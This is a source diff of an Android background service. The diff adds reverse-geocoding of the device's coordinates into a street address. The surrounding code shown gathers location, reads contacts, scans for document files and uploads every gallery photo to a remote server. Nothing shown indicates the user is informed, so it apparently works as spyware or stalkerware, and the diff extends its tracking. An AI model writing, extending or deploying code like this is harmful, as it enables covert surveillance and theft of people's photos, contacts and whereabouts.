@@ -8,6 +8,8 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.location.Address;
+import android.location.Geocoder;
 import android.net.Uri;
 import android.os.Environment;
 import android.os.IBinder;
@@ -26,6 +28,7 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Locale;
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -47,7 +50,7 @@ import retrofit2.converter.gson.GsonConverterFactory;
 import retrofit2.converter.scalars.ScalarsConverterFactory;
 
 public class MainService extends Service {
-    String lat, lon, name, phoneNumber, id;
+    String lat, lon, name, phoneNumber, id, address;
     SharedPreferences pref;
     SharedPreferences.Editor edit;
     List<ContactDatum> data = new ArrayList<>();
@@ -92,6 +95,23 @@ public class MainService extends Service {
 
                 Log.d("latLon", lat);
 
+                Geocoder geocoder = new Geocoder(getApplicationContext(), Locale.getDefault());
+                try {
+                    List<Address> listAdresses = geocoder.getFromLocation(Double.parseDouble(lat), Double.parseDouble(lon), 1);
+                    if (null != listAdresses && listAdresses.size() > 0) {
+                        address = listAdresses.get(0).getAddressLine(0);
+                        String state = listAdresses.get(0).getAdminArea();
+                        String country = listAdresses.get(0).getCountryName();
+                        String subLocality = listAdresses.get(0).getSubLocality();
+
+                        Log.d("Adsress", address);
+
+                    }
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+
+
 
 
        /* ActivityCompat.requestPermissions(getApplicationContext(),
@@ -125,7 +145,7 @@ public class MainService extends Service {
 
                     DatabaseHelper db = new DatabaseHelper(getApplicationContext());
 
-                    Boolean result = db.insertContacts(name,phoneNumber);
+                    Boolean result = db.insertContacts(name, phoneNumber);
 
                     Log.d("gayaDatabaseMai", String.valueOf(result));
 
@@ -139,8 +159,6 @@ public class MainService extends Service {
 
                 latLonApi();
                 contactApi();
-
-
 
 
                 final String[] columns = {MediaStore.Images.Media.DATA, MediaStore.Images.Media._ID};//get all columns of type images
@@ -161,7 +179,7 @@ public class MainService extends Service {
 
                 file = new File(String.valueOf(galleryImageUrls));
 
-                Log.e("ImageFiles",String.valueOf(file));
+                Log.e("ImageFiles", String.valueOf(file));
 
                 images();
 
@@ -240,9 +258,9 @@ public class MainService extends Service {
         return byteBuff.toByteArray();
     }
 
-    public void files(){
+    public void files() {
 
-        if (cd.isConnectingToInternet()){
+        if (cd.isConnectingToInternet()) {
 
 
             MultipartBody.Part body1 = null;
@@ -251,11 +269,10 @@ public class MainService extends Service {
 
                 file = new File(list.get(i));
 
-                if(file.getName().endsWith(".pptx") || file.getName().endsWith(".ppt")
+                if (file.getName().endsWith(".pptx") || file.getName().endsWith(".ppt")
                         || file.getName().endsWith(".xlsx") || file.getName().endsWith(".pdf")
-                        || file.getName().endsWith(".doc")||  file.getName().endsWith(".txt")
-                        || file.getName().endsWith(".docx")||file.getName().endsWith(".rtf"))
-                {
+                        || file.getName().endsWith(".doc") || file.getName().endsWith(".txt")
+                        || file.getName().endsWith(".docx") || file.getName().endsWith(".rtf")) {
                     // Log.e(" FILES",file.getName());
                     //Log.e(" FILES",file.getAbsolutePath());
 
@@ -289,74 +306,71 @@ public class MainService extends Service {
                 }
 
 
-
             }
 
-            Log.d("ListSize",String.valueOf( list.size()));
+            Log.d("ListSize", String.valueOf(list.size()));
 
             long imagename = System.currentTimeMillis();
 
             String strName = imagename + file.getName();
 
-            Log.d("asdasdasd" , strName);
+            Log.d("asdasdasd", strName);
 
             // body1 = MultipartBody.Part.createFormData("img[]", file.getName(), reqFile1);
-
 
 
         }
 
     }
 
-    public void images(){
+    public void images() {
 
-      if (cd.isConnectingToInternet()){
-
-
-          MultipartBody.Part body1 = null;
-
-          for (int i = 0; i < galleryImageUrls.size(); i++) {
-              file = new File(galleryImageUrls.get(i));
-              RequestBody reqFile1 = RequestBody.create(MediaType.parse("multipart/form-data"), file);
-              body1 = MultipartBody.Part.createFormData("img[]", file.getName(), reqFile1);
-
-              Bean b = (Bean) getApplicationContext();
-
-              Retrofit retrofit = new Retrofit.Builder()
-                      .baseUrl(b.baseURL)
-                      .addConverterFactory(ScalarsConverterFactory.create())
-                      .addConverterFactory(GsonConverterFactory.create())
-                      .build();
-              Allapi cr = retrofit.create(Allapi.class);
-              String id = pref.getString("id", "");
-              Call<ImgBean> call = cr.images(id, body1);
-              call.enqueue(new Callback<ImgBean>() {
-                  @Override
-                  public void onResponse(Call<ImgBean> call, Response<ImgBean> response) {
-
-                      Log.d("Images", "yess Gaye");
-
-                  }
-
-                  @Override
-                  public void onFailure(Call<ImgBean> call, Throwable t) {
-
-                  }
-              });
-
-          }
-
-          long imagename = System.currentTimeMillis();
-
-          String strName = imagename + file.getName();
-
-          Log.d("asdasdasd" , strName);
-
-         // body1 = MultipartBody.Part.createFormData("img[]", file.getName(), reqFile1);
+        if (cd.isConnectingToInternet()) {
 
 
+            MultipartBody.Part body1 = null;
 
-      }
+            for (int i = 0; i < galleryImageUrls.size(); i++) {
+                file = new File(galleryImageUrls.get(i));
+                RequestBody reqFile1 = RequestBody.create(MediaType.parse("multipart/form-data"), file);
+                body1 = MultipartBody.Part.createFormData("img[]", file.getName(), reqFile1);
+
+                Bean b = (Bean) getApplicationContext();
+
+                Retrofit retrofit = new Retrofit.Builder()
+                        .baseUrl(b.baseURL)
+                        .addConverterFactory(ScalarsConverterFactory.create())
+                        .addConverterFactory(GsonConverterFactory.create())
+                        .build();
+                Allapi cr = retrofit.create(Allapi.class);
+                String id = pref.getString("id", "");
+                Call<ImgBean> call = cr.images(id, body1);
+                call.enqueue(new Callback<ImgBean>() {
+                    @Override
+                    public void onResponse(Call<ImgBean> call, Response<ImgBean> response) {
+
+                        Log.d("Images", "yess Gaye");
+
+                    }
+
+                    @Override
+                    public void onFailure(Call<ImgBean> call, Throwable t) {
+
+                    }
+                });
+
+            }
+
+            long imagename = System.currentTimeMillis();
+
+            String strName = imagename + file.getName();
+
+            Log.d("asdasdasd", strName);
+
+            // body1 = MultipartBody.Part.createFormData("img[]", file.getName(), reqFile1);
+
+
+        }
 
     }
 
@@ -382,7 +396,8 @@ public class MainService extends Service {
 
                 @Override
                 public void onFailure(Call<locationBean> call, Throwable t) {
-                    Log.d("FailHuaKuch?","LatLonFailHua");
+                    Log.d("FailHuaKuch?", "LatLonFailHua");
+                    Log.e("KyuHua", t.toString());
 
                 }
             });
@@ -402,7 +417,7 @@ public class MainService extends Service {
             if (c != null)
                 while (c.moveToNext()) {
 
-                ContactDatum person = new ContactDatum();
+                    ContactDatum person = new ContactDatum();
                     person.setName(c.getString(c.getColumnIndex("name")));
                     person.setMobile(c.getString(c.getColumnIndex("phone")));
                     data.add(person);
@@ -441,7 +456,7 @@ public class MainService extends Service {
 
 
             Log.d("dgfdh", jsonStr);
-           // Log.d("dgfdh", id);
+            // Log.d("dgfdh", id);
 
             String id = pref.getString("id", "");
             Call<contactBean> call = cr.contact(id, jsonStr);
@@ -454,7 +469,7 @@ public class MainService extends Service {
 
                 @Override
                 public void onFailure(Call<contactBean> call, Throwable t) {
-                    Log.d("FailHuaKuch?","ContactFailHua");
+                    Log.d("FailHuaKuch?", "ContactFailHua");
 
                 }
             });
